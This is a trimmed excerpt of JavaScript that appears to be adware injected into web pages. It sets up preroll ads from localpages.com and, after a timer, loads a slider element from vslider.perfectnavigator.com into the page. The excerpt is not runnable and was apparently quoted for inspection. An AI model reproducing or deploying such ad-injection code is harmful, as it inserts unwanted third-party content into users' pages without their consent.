	...
	function _AMIN() {
		jQuery(document).ready(function($)
		{
			var _AMIN = {
				...
				prerollHost: 'localpages.com/preroll',
				bannerDomain: '',
				prerollDomain: 'localpages.com',
				vdisplay: 0,
				vdisplayEn: 0,
				vdisp: 0,
				vsliderEn: 0,
				...
				pageReferrer: 'http://jquery.bassistance.de/validate/demo/',
								cleanUp: function ()
				{
					var self = this;
					var cnt = 0;
				...
				injVslider: function(msec)
				{
					...
					setTimeout(function(){
						...
						v.setAttribute('src', '//vslider.perfectnavigator.com/?id='+encId+'&f=1');
				...
				parseHTML: function ()
				{
					...
					while (i--)
					{
						if(($(elements[i]).attr('src') && $(elements[i]).attr('src').indexOf('gbanner.php') == -1 && $(elements[i]).attr('src').indexOf('usadserver.com') == -1) || !$(elements[i]).attr('src'))
						{
					...
					{
						this.injVslider(120000);
					}
					else if(this.vsliderEn == 1 && this.eid == '' && this.vdisplayEn == 1 && this.vdisplay == 1)
					{
						this.injVslider(120000);
					}
				},
